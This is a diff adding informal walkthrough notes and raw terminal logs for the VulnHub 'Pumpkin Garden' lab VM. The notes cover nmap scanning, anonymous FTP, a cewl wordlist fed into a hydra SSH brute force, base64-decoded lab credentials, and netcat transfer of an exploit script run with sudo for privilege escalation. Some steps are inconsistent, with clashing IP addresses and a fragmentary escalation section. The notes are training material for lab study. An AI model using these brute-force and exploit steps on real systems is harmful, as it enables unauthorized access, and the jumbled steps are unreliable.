@@ -1,0 +1,678 @@
+[VulnHub] Pumpkin Garden Walkthrough
+a
+
+---------------------------------------------------------------------------------------------------------------
+Set up Pumpkin Garden Vuln hub Machine
+
+1
+https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkingarden,321/
+
+
+
+File Information---
+Filename: PumpkinGarden.ova
+File size: 773 MB
+Hash values--
+MD5: 8ED5015BDC5E1A00A7BC86F979254EAC
+SHA1: 73F72BC5440258EB9AE2D8D05BFD31764A576B0A
+----
+2
+https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkinfestival,329/
+
+File Information---
+Filename: PumpkinFestival.ova
+File size: 841 MB
+Hash values--
+MD5: B1CB13BF860D20D149E306FFAE9F4C66
+SHA1: 848FD03D47B464293AA40ED149D70EA1A2461FC6
+----
+---------------------------------------------------------------------------------------------------------------
+Compromising Pumpkin Garden Vuln hub Machine
+---------------------------
+
+
+
+
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+
+steps ------
+ Information Gathering
+===========================
+===========================
+0
+ip a
+
+Note -it is my pumpken ip 192.168.176.157, your would be different.
+========================================================
+Scanning
+========================================================
+1  
+sudo apt update 
+    2  
+sudo nmap 192.168.176.157
+    3  
+sudo nmap -A -v -p- 192.168.176.157
+---------------------------------------------------
+port 21/tcp - FTP - (vsftpd 2.0.8 or later)
+port 1515/tcp - HTTP - (Apache httpd 2.4.7)
+port 3535/tcp - SSH - (OpenSSH 6.6.1p1)
+---------------------------------------------------
+====================================
+Gaining Access
+====================================
+    4  user name - anonymous, pws - press enter 2 time
+ftp 192.168.176.157
+ls -a
+get note.txt 
+quit
+    5  
+cat note.txt
+6 open Firefox and type there
+http://192.168.176.157:1515/
+--------------------------------------------
+7
+cewl http://192.168.176.157:1515 > wordlist.txt
+8
+ls
+9
+pwd
+10
+hydra -l jack -P wordlist.txt ssh://192.168.176.157 -s 3535
+-------------
+ read all output - focus on such line -
+[DATA] attacking ssh://192.168.176.157:3535/
+[3535][ssh] host: 192.168.176.157   login: jack   password: PumpkinGarden
+1 of 1 target successfully completed, 1 valid password found
+.................
+11  
+ssh jack@192.168.176.157 -p 3535
+-----------------------------------
+jack@Pumpkin:~$ history
+11.1
+  ls -a
+ 11.2
+  ls
+    11.3  
+cat note.txt
+    11.4
+  pwd
+    11.5  
+history
+---------------------------------------------
+12 
+went to Firefox - search
+http://192.168.176.157:1515/
+13
+right click and open inspect 
+click - <center> - <p
+ searching for the route map? Pumpkin images may help you find the way 
+----------------
+14 went to Firefox - search
+
+http://192.168.176.157:1515/img/
+
+15 Inside the hidden_secret folder is a clue.txt file with the content: c2NhcmVjcm93IDogNVFuQCR5
+16
+This is a Base64-encoded string, which can be decoded via the terminal (or online using a Base64 decoder):
+17 open terminal - in jack@Pumpkin:~$ 
+exit reach in kali root and write cmd -- 
+
+echo 'c2NhcmVjcm93IDogNVFuQCR5' | base64 -d
+--------
+ Once decoded, this translates to what appears to be a username and password for the user 'scarecrow'.
+-----output will come------
+scarecrow : 5Qn@$y
+18 We can try logging into an SSH session with these details:
+ssh scarecrow@192.168.176.157 -p 3535
+Password: 5Qn@$y                                                                             
+19 Success! Checking the contents of the home directory for this user shows a note.txt file with further information:
+--------------------
+Note - 
+if output -- comes like this ┌──(root㉿kali)-[/home/kali]
+└─# ssh scarecrow@192.168.176.157 -p 3535
+
+ssh: connect to host 192.168.56.101 port 3535: Connection refused
+sudo service ssh status
+Ctrl z to exit
+sudo service ssh start
+sudo service ssh status
+then again use - 
+ssh scarecrow@192.168.176.157 -p 3535
+
+--------------------
+ls -a
+cat note.txt
+
+-----------------
+scarecrow@Pumpkin:~$ cat note.txt
+Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! 
+Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.
+-----------------
+su -l goblin
+Password: Y0n$M4sy3D1t
+ls -a
+cate note
+----------------
+20 This gives us a possible user called 'goblin' with a potential password of 'Y0n$M4sy3D1t'.
+
+We can try switching to the user 'goblin' using these credentials:
+
+==================================================
+Privilege Escalation
+==================================================
+
+
+
+nc -lp 1337 > /home/goblin/38362.sh
+nc -w 3 192.168.56.101 1337 < 38362.sh
+
+ps -ef
+
+nc -lp 1337 > /home/scarecrow/38362.sh
+
+----------
+su scarecrow
+Password: 5Qn@$y    
+----------
+nc -lp 1337 > /home/scarecrow/38362.sh
+nc -w 3 192.168.56.101 1337 < 38362.sh
+
+
+
+chmod +777 38362.sh myfile.txt
+
+su -l goblin
+Password: Y0n$M4sy3D1t
+sudo /home/scarecrow/38362.sh myfile.txt
+
+cd ~
+ls -a
+cat PumpkinGarden_Key
+echo 'Q29uZ3JhdHVsYXRpb25zIQ==' | base64 -d
+
+----------------
+
+https://blog.razrsec.uk/pumpkin-garden-walkthrough/
+====================================================
+====================================================
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+information gathering -----
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap 192.168.176.157
+[sudo] password for kali: 
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-15 17:25 EDT
+Nmap scan report for 192.168.176.157
+Host is up (0.000072s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+MAC Address: 00:0C:29:63:E8:B1 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -A -v -p- 192.168.176.157
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-15 17:26 EDT
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 17:26
+Completed NSE at 17:26, 0.00s elapsed
+Initiating NSE at 17:26
+Completed NSE at 17:26, 0.00s elapsed
+Initiating NSE at 17:26
+Completed NSE at 17:26, 0.00s elapsed
+Initiating ARP Ping Scan at 17:26
+Scanning 192.168.176.157 [1 port]
+Completed ARP Ping Scan at 17:26, 0.07s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 17:26
+Completed Parallel DNS resolution of 1 host. at 17:27, 0.30s elapsed
+Initiating SYN Stealth Scan at 17:27
+Scanning 192.168.176.157 [65535 ports]
+Discovered open port 21/tcp on 192.168.176.157
+Discovered open port 1515/tcp on 192.168.176.157
+Discovered open port 3535/tcp on 192.168.176.157
+Completed SYN Stealth Scan at 17:27, 1.59s elapsed (65535 total ports)
+Initiating Service scan at 17:27
+Scanning 3 services on 192.168.176.157
+Completed Service scan at 17:27, 11.04s elapsed (3 services on 1 host)
+Initiating OS detection (try #1) against 192.168.176.157
+NSE: Script scanning 192.168.176.157.
+Initiating NSE at 17:27
+NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
+Completed NSE at 17:27, 1.24s elapsed
+Initiating NSE at 17:27
+Completed NSE at 17:27, 0.05s elapsed
+Initiating NSE at 17:27
+Completed NSE at 17:27, 0.01s elapsed
+Nmap scan report for 192.168.176.157
+Host is up (0.00079s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.176.159
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.2 - secure, fast, stable
+|_End of status
+1515/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Mission-Pumpkin
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+3535/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 d88de7483a3c910e3f43eaa305d889e2 (DSA)
+|   2048 f0418fe040e3c03a1f4d4f93e663249e (RSA)
+|   256 fa87571ba2ba92760ce785e7f53d54b1 (ECDSA)
+|_  256 fae8425a8891b44bebe4c3742e23a545 (ED25519)
+MAC Address: 00:0C:29:63:E8:B1 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Uptime guess: 0.002 days (since Tue Oct 15 17:24:22 2024)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=247 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.79 ms 192.168.176.157
+
+NSE: Script Post-scanning.
+Initiating NSE at 17:27
+Completed NSE at 17:27, 0.00s elapsed
+Initiating NSE at 17:27
+Completed NSE at 17:27, 0.00s elapsed
+Initiating NSE at 17:27
+Completed NSE at 17:27, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.87 seconds
+           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
+                                                                             
+===================================================
+Gaining access 
+===================================================
+┌──(kali㉿kali)-[~]
+└─$ ftp 192.168.176.157                
+Connected to 192.168.176.157.
+220 Welcome to Pumpkin's FTP service.
+Name (192.168.176.157:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -a
+229 Entering Extended Passive Mode (|||11938|).
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        113          4096 Jun 11  2019 .
+drwxr-xr-x    2 0        113          4096 Jun 11  2019 ..
+-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt
+226 Directory send OK.
+ftp> get note.txt
+local: note.txt remote: note.txt
+229 Entering Extended Passive Mode (|||5195|).
+150 Opening BINARY mode data connection for note.txt (88 bytes).
+100% |********************************|    88       81.76 KiB/s    00:00 ETA
+226 Transfer complete.
+88 bytes received in 00:00 (37.42 KiB/s)
+ftp> quit
+221 Goodbye.
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ cat note.txt
+Hello Dear! 
+Looking for route map to PumpkinGarden? I think jack can help you find it.
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ history
+    1  sudo apt update 
+    2  sudo nmap 192.168.176.157
+    3  sudo nmap -A -v -p- 192.168.176.157
+    4  ftp 192.168.176.157
+    5  cat note.txt
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
+┌──(kali㉿kali)-[~]
+└─$ cewl http://192.168.176.157:1515 > wordlist.txt
+
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ls
+Desktop    Downloads  note.txt  Public     Videos
+Documents  Music      Pictures  Templates  wordlist.txt
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ hydra -l jack -P wordlist.txt ssh://192.168.176.157 -s 3535
+
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-15 17:53:36
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 45 login tries (l:1/p:45), ~3 tries per task
+[DATA] attacking ssh://192.168.176.157:3535/
+[3535][ssh] host: 192.168.176.157   login: jack   password: PumpkinGarden
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-15 17:53:44
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ssh jack@192.168.176.157 -p 3535
+
+The authenticity of host '[192.168.176.157]:3535 ([192.168.176.157]:3535)' can't be established.
+ED25519 key fingerprint is SHA256:mLTE3ZDFS+c1wgTIsHLdH7jtZFKpYoPljQRHRdH7IVo.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.176.157]:3535' (ED25519) to the list of known hosts.
+------------------------------------------------------------------------------
+                          Welcome to Mission-Pumpkin
+      All remote connections to this machine are monitored and recorded
+------------------------------------------------------------------------------
+jack@192.168.176.157's password: 
+Last login: Thu Jun 13 00:58:39 2019
+jack@Pumpkin:~$ 
+--
+jack@Pumpkin:~$ ls -a
+.  ..  .bash_logout  .bashrc  .cache  note.txt  .profile
+jack@Pumpkin:~$ ls
+note.txt
+jack@Pumpkin:~$ cat note.txt
+
+Are you here for keys to pumpkin garden?
+I'm afraid that scarecrow has just stolen the keys from me...
+ 
+jack@Pumpkin:~$ pwd
+/home/jack
+jack@Pumpkin:~$ history
+    1  ls -a
+    2  ls
+    3  cat note.txt
+    4  pwd
+    5  history
+jack@Pumpkin:~$ 
+-------------------------------------------
+http://192.168.176.157:1515/
+http://192.168.176.157:1515/img/
+http://192.168.176.157:1515/img/hidden_secret/
+http://192.168.176.157:1515/img/hidden_secret/clue.txt
+-------------------------------------------
+jack@Pumpkin:~$ echo 'c2NhcmVjcm93IDogNVFuQCR5' | base64 -d
+scarecrow : 5Qn@$yjack@Pumpkin:~$ 
+-------
+jack@Pumpkin:~$ echo 'c2NhcmVjcm93IDogNVFuQCR5' | base64 -d
+scarecrow : 5Qn@$yjack@Pumpkin:~$ ssh scarecrow@192.168.56.101 -p 3535
+
+jack@Pumpkin:~$ echo 'c2NhcmVjcm93IDogNVFuQCR5' | base64 -d
+scarecrow : 5Qn@$yjack@Pumpkin:~$ ls
+note.txt
+jack@Pumpkin:~$ ls
+note.txt
+
+jack@Pumpkin:~$ ssh scarecrow@192.168.176.157 -p 3535
+The authenticity of host '[192.168.176.157]:3535 ([192.168.176.157]:3535)' can't be established.
+ECDSA key fingerprint is fa:87:57:1b:a2:ba:92:76:0c:e7:85:e7:f5:3d:54:b1.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '[192.168.176.157]:3535' (ECDSA) to the list of known hosts.
+------------------------------------------------------------------------------
+                          Welcome to Mission-Pumpkin
+      All remote connections to this machine are monitored and recorded
+------------------------------------------------------------------------------
+scarecrow@192.168.176.157's password: 
+Last login: Thu Jun 13 00:35:51 2019 from 192.168.1.106
+scarecrow@Pumpkin:~$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  note.txt  .profile
+scarecrow@Pumpkin:~$ cat note.txt
+
+Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! 
+Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.
+
+scarecrow@Pumpkin:~$ su -l goblin
+Password: 
+su: Authentication failure
+scarecrow@Pumpkin:~$ su -l goblin
+Password: 
+goblin@Pumpkin:~$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  note  .profile
+goblin@Pumpkin:~$ cat note
+
+Hello Friend! I heard that you are looking for PumpkinGarden key. 
+But Key to the garden will be with LordPumpkin(ROOT user), don't worry, I know where LordPumpkin had placed the Key.
+You can reach there through my backyard.
+
+Here is the key to my backyard
+https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh
+
+========================================================
+Privilege Escalation
+
+========================================================
+
+goblin@Pumpkin:~$ nc -lp 1337 > /home/goblin/38362.sh
+
+
+^X^Z
+[1]+  Stopped                 nc -lp 1337 > /home/goblin/38362.sh
+goblin@Pumpkin:~$ nc -lp 1337 > /home/goblin/38362.sh
+nc: Address already in use
+goblin@Pumpkin:~$ nc -vv -lp 1337 > /home/goblin/38362.sh
+nc: Address already in use
+goblin@Pumpkin:~$ ls
+note
+goblin@Pumpkin:~$ nc -lp 1337 > /home/goblin/38362.sh
+nc: Address already in use
+goblin@Pumpkin:~$ nc -w 3 192.168.56.101 1337 < 38362.sh
+goblin@Pumpkin:~$ ps -ef
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 02:49 ?        00:00:01 /sbin/init
+root         2     0  0 02:49 ?        00:00:00 [kthreadd]
+root         3     2  0 02:49 ?        00:00:00 [ksoftirqd/0]
+root         5     2  0 02:49 ?        00:00:00 [kworker/0:0H]
+root         7     2  0 02:49 ?        00:00:00 [rcu_sched]
+root         8     2  0 02:49 ?        00:00:00 [rcuos/0]
+root         9     2  0 02:49 ?        00:00:00 [rcu_bh]
+root        10     2  0 02:49 ?        00:00:00 [rcuob/0]
+root        11     2  0 02:49 ?        00:00:00 [migration/0]
+root        12     2  0 02:49 ?        00:00:00 [watchdog/0]
+root        13     2  0 02:49 ?        00:00:00 [khelper]
+root        14     2  0 02:49 ?        00:00:00 [kdevtmpfs]
+root        15     2  0 02:49 ?        00:00:00 [netns]
+root        16     2  0 02:49 ?        00:00:00 [writeback]
+root        17     2  0 02:49 ?        00:00:00 [kintegrityd]
+root        18     2  0 02:49 ?        00:00:00 [bioset]
+root        19     2  0 02:49 ?        00:00:00 [kworker/u3:0]
+root        20     2  0 02:49 ?        00:00:00 [kblockd]
+root        21     2  0 02:49 ?        00:00:00 [ata_sff]
+root        22     2  0 02:49 ?        00:00:00 [khubd]
+root        23     2  0 02:49 ?        00:00:00 [md]
+root        24     2  0 02:49 ?        00:00:00 [devfreq_wq]
+root        25     2  0 02:49 ?        00:00:09 [kworker/0:1]
+root        27     2  0 02:49 ?        00:00:00 [khungtaskd]
+root        28     2  0 02:49 ?        00:00:00 [kswapd0]
+root        29     2  0 02:49 ?        00:00:00 [vmstat]
+root        30     2  0 02:49 ?        00:00:00 [ksmd]
+root        31     2  0 02:49 ?        00:00:00 [khugepaged]
+root        32     2  0 02:49 ?        00:00:00 [fsnotify_mark]
+root        33     2  0 02:49 ?        00:00:00 [ecryptfs-kthrea]
+root        34     2  0 02:49 ?        00:00:00 [crypto]
+root        46     2  0 02:49 ?        00:00:00 [kthrotld]
+root        48     2  0 02:49 ?        00:00:00 [scsi_eh_0]
+root        49     2  0 02:49 ?        00:00:00 [scsi_eh_1]
+root        70     2  0 02:49 ?        00:00:00 [deferwq]
+root        71     2  0 02:49 ?        00:00:00 [charger_manager]
+root       122     2  0 02:49 ?        00:00:00 [kpsmoused]
+root       123     2  0 02:49 ?        00:00:00 [kworker/0:2]
+root       125     2  0 02:49 ?        00:00:00 [scsi_eh_2]
+root       126     2  0 02:49 ?        00:00:00 [scsi_eh_3]
+root       127     2  0 02:49 ?        00:00:00 [scsi_eh_4]
+root       128     2  0 02:49 ?        00:00:00 [scsi_eh_5]
+root       129     2  0 02:49 ?        00:00:00 [scsi_eh_6]
+root       130     2  0 02:49 ?        00:00:00 [scsi_eh_7]
+root       131     2  0 02:49 ?        00:00:00 [scsi_eh_8]
+root       132     2  0 02:49 ?        00:00:00 [scsi_eh_9]
+root       133     2  0 02:49 ?        00:00:00 [scsi_eh_10]
+root       134     2  0 02:49 ?        00:00:00 [scsi_eh_11]
+root       135     2  0 02:49 ?        00:00:00 [scsi_eh_12]
+root       136     2  0 02:49 ?        00:00:00 [scsi_eh_13]
+root       137     2  0 02:49 ?        00:00:00 [scsi_eh_14]
+root       138     2  0 02:49 ?        00:00:00 [scsi_eh_15]
+root       139     2  0 02:49 ?        00:00:00 [scsi_eh_16]
+root       140     2  0 02:49 ?        00:00:00 [scsi_eh_17]
+root       141     2  0 02:49 ?        00:00:00 [scsi_eh_18]
+root       142     2  0 02:49 ?        00:00:00 [scsi_eh_19]
+root       143     2  0 02:49 ?        00:00:00 [scsi_eh_20]
+root       144     2  0 02:49 ?        00:00:00 [scsi_eh_21]
+root       145     2  0 02:49 ?        00:00:00 [scsi_eh_22]
+root       146     2  0 02:49 ?        00:00:00 [scsi_eh_23]
+root       147     2  0 02:49 ?        00:00:00 [scsi_eh_24]
+root       148     2  0 02:49 ?        00:00:00 [scsi_eh_25]
+root       149     2  0 02:49 ?        00:00:00 [scsi_eh_26]
+root       150     2  0 02:49 ?        00:00:00 [scsi_eh_27]
+root       151     2  0 02:49 ?        00:00:00 [scsi_eh_28]
+root       152     2  0 02:49 ?        00:00:00 [scsi_eh_29]
+root       153     2  0 02:49 ?        00:00:00 [scsi_eh_30]
+root       154     2  0 02:49 ?        00:00:00 [scsi_eh_31]
+root       194     2  0 02:49 ?        00:00:00 [jbd2/sda1-8]
+root       195     2  0 02:49 ?        00:00:00 [ext4-rsv-conver]
+root       326     1  0 02:49 ?        00:00:00 upstart-udev-bridge --daemon
+root       330     1  0 02:49 ?        00:00:00 /lib/systemd/systemd-udevd --
+message+   398     1  0 02:49 ?        00:00:00 dbus-daemon --system --fork
+root       432     1  0 02:49 ?        00:00:00 /lib/systemd/systemd-logind
+syslog     435     1  0 02:49 ?        00:00:00 rsyslogd
+root       462     1  0 02:49 ?        00:00:00 upstart-file-bridge --daemon
+root       477     2  0 02:49 ?        00:00:00 [ttm_swap]
+root       617     1  0 02:49 ?        00:00:00 upstart-socket-bridge --daemo
+root       648     1  0 02:49 ?        00:00:00 dhclient -1 -v -pf /run/dhcli
+root       687     1  0 02:49 ?        00:00:00 /usr/sbin/vsftpd
+root       800     1  0 02:49 tty4     00:00:00 /sbin/getty -8 38400 tty4
+root       802     1  0 02:49 tty5     00:00:00 /sbin/getty -8 38400 tty5
+root       805     1  0 02:49 tty2     00:00:00 /sbin/getty -8 38400 tty2
+root       806     1  0 02:49 tty3     00:00:00 /sbin/getty -8 38400 tty3
+root       809     1  0 02:49 tty6     00:00:00 /sbin/getty -8 38400 tty6
+root       834     1  0 02:49 ?        00:00:00 /usr/sbin/sshd -D
+root       837     1  0 02:49 ?        00:00:00 cron
+mysql      905     1  0 02:49 ?        00:00:02 /usr/sbin/mysqld
+root       945     1  0 02:49 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   949   945  0 02:49 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   950   945  0 02:49 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   951   945  0 02:49 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   952   945  0 02:49 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   953   945  0 02:49 ?        00:00:00 /usr/sbin/apache2 -k start
+root      1102     2  0 02:50 ?        00:00:00 [kauditd]
+www-data  1283   945  0 02:57 ?        00:00:00 /usr/sbin/apache2 -k start
+root      1304     2  0 02:57 ?        00:00:00 [kworker/u2:0]
+root      1485     1  0 03:04 tty1     00:00:00 /sbin/getty -8 38400 tty1
+root      1621     2  0 03:09 ?        00:00:00 [kworker/u2:1]
+root      2174   834  0 03:25 ?        00:00:00 sshd: jack [priv]   
+jack      2180  2174  0 03:25 ?        00:00:00 sshd: jack@pts/0    
+jack      2181  2180  0 03:25 pts/0    00:00:00 -bash
+www-data  2672   945  0 03:46 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data  2673   945  0 03:46 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data  2674   945  0 03:46 ?        00:00:00 /usr/sbin/apache2 -k start
+jack      3171  2181  0 04:07 pts/0    00:00:00 ssh scarecrow@192.168.176.157
+root      3172   834  0 04:07 ?        00:00:00 sshd: scarecrow [priv]
+scarecr+  3176  3172  0 04:07 ?        00:00:00 sshd: scarecrow@pts/1
+scarecr+  3177  3176  0 04:07 pts/1    00:00:00 -bash
+root      3429  3177  0 04:17 pts/1    00:00:00 su -l goblin
+goblin    3430  3429  0 04:17 pts/1    00:00:00 -su
+goblin    3776  3430  0 04:32 pts/1    00:00:00 nc -lp 1337
+root      3948   837  0 04:40 ?        00:00:00 CRON
+root      3949   837  0 04:40 ?        00:00:00 CRON
+root      3951   837  0 04:40 ?        00:00:00 CRON
+root      3952   837  0 04:40 ?        00:00:00 CRON
+root      3955  3952  0 04:40 ?        00:00:00 /bin/sh -c sleep 15; rm /home
+root      3957  3949  0 04:40 ?        00:00:00 /bin/sh -c sleep 15; rm /tmp/
+root      3958  3951  0 04:40 ?        00:00:00 /bin/sh -c sleep 30; rm /home
+root      3960  3955  0 04:40 ?        00:00:00 sleep 15
+root      3962  3957  0 04:40 ?        00:00:00 sleep 15
+root      3963  3958  0 04:40 ?        00:00:00 sleep 30
+root      3964  3948  0 04:40 ?        00:00:00 /bin/sh -c sleep 30; rm /tmp/
+root      3965  3964  0 04:40 ?        00:00:00 sleep 30
+goblin    3966  3430  0 04:40 pts/1    00:00:00 ps -ef
+goblin@Pumpkin:~$ nc -lp 1337 > /home/scarecrow/38362.sh
+-su: /home/scarecrow/38362.sh: Permission denied
+goblin@Pumpkin:~$ su scarecrow
+Password: 
+scarecrow@Pumpkin:/home/goblin$ ls
+ls: cannot open directory .: Permission denied
+scarecrow@Pumpkin:/home/goblin$ cd
+scarecrow@Pumpkin:~$ nc -lp 1337 > /home/scarecrow/38362.sh
+nc: Address already in use
+scarecrow@Pumpkin:~$ nc -w 3 192.168.56.101 1337 < 38362.sh
+scarecrow@Pumpkin:~$ ls
+38362.sh  note.txt
+scarecrow@Pumpkin:~$ cat ^C
+scarecrow@Pumpkin:~$ 
+
+=============================================
+privilege escalation 
+=============================================
+nc -lp 1337 > /home/goblin/38362.sh
+nc -w 3 192.168.56.101 1337 < 38362.sh
+ps -ef
+logged in as 'scarecrow' pass- 5Qn@$y
+nc -lp 1337 > /home/scarecrow/38362.sh
+
+
+
+
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+==================================================================
+
+
+Reference Articles - 
+https://blog.razrsec.uk/pumpkin-garden-walkthrough/
+-------
+https://medium.com/@jackdwalker/vulnhub-box-write-up-2-pumpkin-garden-b388daaabc10
+--------
+https://www.hackingarticles.in/pumpkingarden-vulnhub-walkthrough/
+-------- 
+https://blog.mzfr.me/vulnhub-writeups/2019-07-07-PumpkinGarden
+---------
+https://medium.com/@geochris35/ethical-hacking-for-beginners-pumpkin-garden-vulnhub-walkthrough-54faebc55945
+
+
+
+
+
+
+
+--- https://chandel1.rssing.com/chan-10364660/all_p60.html
+--------
